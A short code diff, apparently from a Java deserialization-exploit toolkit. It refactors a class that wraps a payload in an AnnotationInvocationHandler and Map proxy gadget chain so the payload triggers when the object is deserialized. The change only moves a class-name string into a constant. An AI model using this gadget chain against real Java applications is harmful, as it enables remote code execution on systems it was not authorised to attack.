@@ -11,18 +11,20 @@ import java.util.Map;
 @Dependencies()
 public class AnnotationInvocationHandlerMapGet implements MapGetTrampoline {
 
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+
     @Override
     public Object wrapPayload(Object payload, Object param) {
         Object triggerGadget = null;
 
         try {
             InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(
-                    "sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, payload);
+                    ANN_INV_HANDLER_CLASS).newInstance(Override.class, payload);
             Map mapProxy = (Map) Proxy.newProxyInstance(MapGetTrampoline.class.getClassLoader(), new Class[]{Map.class}, handler);
 
-            triggerGadget = Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, mapProxy);
+            triggerGadget = Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, mapProxy);
 
-        } catch (Exception e) { }
+        } catch (Exception e) {    }
 
         return triggerGadget;
     }
